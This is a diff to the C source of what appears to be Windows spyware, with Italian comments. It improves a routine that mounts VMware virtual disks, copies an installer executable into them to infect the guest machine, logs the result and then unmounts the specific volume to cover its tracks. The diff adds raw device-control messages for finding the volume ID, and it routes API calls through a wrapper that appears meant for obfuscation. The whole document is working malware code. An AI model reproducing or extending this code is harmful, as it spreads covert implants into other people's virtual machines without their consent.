@@ -744,6 +744,10 @@ BOOL StartVMService()
 	STARTUPINFO si;
     PROCESS_INFORMATION pi;
 
+	// Verifica che non sia gia' startato per conto suo
+	if (HM_FindPid("vixDiskMountServer.exe", FALSE))
+		return TRUE;
+
 	if(FNC(RegOpenKeyExA)(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\vmplayer.exe", 0, KEY_READ, &hKey) != ERROR_SUCCESS) 
 		return FALSE;
 	len = sizeof(service_path);
@@ -765,19 +769,38 @@ BOOL StartVMService()
 	return TRUE;
 }
 
-// Monta un disco virtuale
-BOOL MountVMDisk(char *disk_path, char *drive_letter)
+// Dato il path, torna il voulme id
+DWORD FindDiskID(HANDLE hfile, char *disk_path)
 {
-	static BOOL service_started = FALSE;
+	DWORD dummy;
+	char reply[0x3FDC];
+	char string_match[MAX_PATH*2];
+	char *ptr;
+	DWORD disk_id = 0;
+	BYTE msg[20] = { 0x14, 0x00, 0x00, 0x00, 0xd0, 0x94, 0x57, 0x04, 0xba, 0xab, 0x00 ,0x00, 0x00, 0x00, 0x6d, 0x64, 0x04, 0x00, 0x00, 0x00};
+
+	if (!DeviceIoControl(hfile, 0x2a002c, &msg, sizeof(msg), reply, sizeof(reply), &dummy, NULL)) 
+		return 0;
+
+	_snprintf_s(string_match, sizeof(string_match), " type=disk_volume file=\"%s\"", disk_path);
+	if (! (ptr = (char *)memmem(reply, sizeof(reply), string_match, strlen(string_match))) )
+		return 0;
+	*ptr = 0;
+	ptr -= 3;
+	disk_id = atoi(ptr);
+	return disk_id;
+}
+
+// Monta un disco virtuale
+BOOL MountVMDisk(char *disk_path, char *drive_letter, DWORD *volume_id)
+{
 	HANDLE hfile;
 	char reply[0x3FDC];
 	_ioctl_vstor msg;
 	DWORD dummy;
 
 	// Al primo tentativo di mount starta il servizio
-	if (!service_started) 
-		service_started = StartVMService();
-	if (!service_started) 
+	if (!StartVMService())
 		return FALSE;
 
 	// Costruisce il messaggio
@@ -800,6 +823,8 @@ BOOL MountVMDisk(char *disk_path, char *drive_letter)
 		CloseHandle(hfile);
 		return FALSE;
 	}
+
+	*volume_id = FindDiskID(hfile, disk_path);
 	CloseHandle(hfile);
 	return TRUE;
 }
@@ -873,12 +898,13 @@ BOOL InfectVMDisk(char *drive_letter, char *exe_name)
 void InfectVMWare(char *disk_path)
 {
 	char *drive_letter;
+	DWORD volume_id = 0;
 	WCHAR msg[MAX_PATH*2];
 
 	if (! (drive_letter = FindFreeDriveLetter()) )
 		return;
 
-	if (!MountVMDisk(disk_path, drive_letter))
+	if (!MountVMDisk(disk_path, drive_letter, &volume_id))
 		return;
 
 	if (InfectVMDisk(drive_letter, EXE_INSTALLER_NAME)) {
@@ -887,9 +913,12 @@ void InfectVMWare(char *disk_path)
 		SendStatusLog(msg);	
 	}
 
-	// XXX - Ancora non so da dove recuperare il volume ID
-	for (int i=100; i<256; i++)
-		UnmountVMDisk(drive_letter, i);
+	// Se non e' riuscito a recuperare l'id del volume prova a smontarli tutti
+	if (volume_id == 0) {
+		for (int i=100; i<256; i++)
+			UnmountVMDisk(drive_letter, i);
+	} else
+		UnmountVMDisk(drive_letter, volume_id);
 }
 
 // Cerca tutti i dischi delle vmware preferite
